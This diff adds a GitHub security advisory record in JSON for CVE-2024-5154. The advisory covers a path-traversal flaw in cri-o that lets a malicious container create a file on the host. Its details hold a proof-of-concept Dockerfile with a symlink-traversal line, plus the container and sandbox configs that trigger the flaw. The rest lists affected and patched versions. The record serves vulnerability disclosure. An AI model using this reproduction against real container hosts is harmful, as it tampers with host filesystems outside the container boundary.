@@ -1,0 +1,101 @@
+{
+  "schema_version": "1.4.0",
+  "id": "GHSA-j9hf-98c3-wrm8",
+  "modified": "2024-06-04T18:12:31Z",
+  "published": "2024-06-04T18:12:31Z",
+  "aliases": [
+    "CVE-2024-5154"
+  ],
+  "summary": "malicious container creates symlink \"mtab\" on the host External",
+  "details": "### Impact\nA malicious container can affect the host by taking advantage of code cri-o added to show the container mounts on the host.\n\nA workload built from this Dockerfile:\n```\nFROM docker.io/library/busybox as source\nRUN mkdir /extra && cd /extra && ln -s ../../../../../../../../root etc\n\nFROM scratch\n\nCOPY --from=source /bin /bin\nCOPY --from=source /lib /lib\nCOPY --from=source /extra .\n\n```\n\nand this container config:\n\n```\n{\n  \"metadata\": {\n      \"name\": \"busybox\"\n  },\n  \"image\":{\n      \"image\": \"localhost/test\"\n  },\n  \"command\": [\n      \"/bin/true\"\n  ],\n  \"linux\": {\n  }\n}\n\n\n```\nand this sandbox config  \n```\n{\n  \"metadata\": {\n    \"name\": \"test-sandbox\",\n    \"namespace\": \"default\",\n    \"attempt\": 1,\n    \"uid\": \"edishd83djaideaduwk28bcsb\"\n  },\n  \"linux\": {\n    \"security_context\": {\n      \"namespace_options\": {\n        \"network\": 2\n      }\n    }\n  }\n}\n\n```\n\nwill create a file on host `/host/mtab`\n\n### Patches\n1.30.1, 1.29.5, 1.28.7\n\n### Workarounds\nUnfortunately not\n\n### References\n_Are there any links users can visit to find out more?_\n",
+  "severity": [
+
+  ],
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "github.com/cri-o/cri-o"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "1.30.0"
+            },
+            {
+              "fixed": "1.30.1"
+            }
+          ]
+        }
+      ],
+      "versions": [
+        "1.30.0"
+      ]
+    },
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "github.com/cri-o/cri-o"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "1.29.4"
+            },
+            {
+              "fixed": "1.29.5"
+            }
+          ]
+        }
+      ],
+      "versions": [
+        "1.29.4"
+      ]
+    },
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "github.com/cri-o/cri-o"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "1.28.6"
+            },
+            {
+              "fixed": "1.28.7"
+            }
+          ]
+        }
+      ],
+      "versions": [
+        "1.28.6"
+      ]
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/cri-o/cri-o/security/advisories/GHSA-j9hf-98c3-wrm8"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/cri-o/cri-o"
+    }
+  ],
+  "database_specific": {
+    "cwe_ids": [
+      "CWE-22"
+    ],
+    "severity": "HIGH",
+    "github_reviewed": true,
+    "github_reviewed_at": "2024-06-04T18:12:31Z",
+    "nvd_published_at": null
+  }
+}
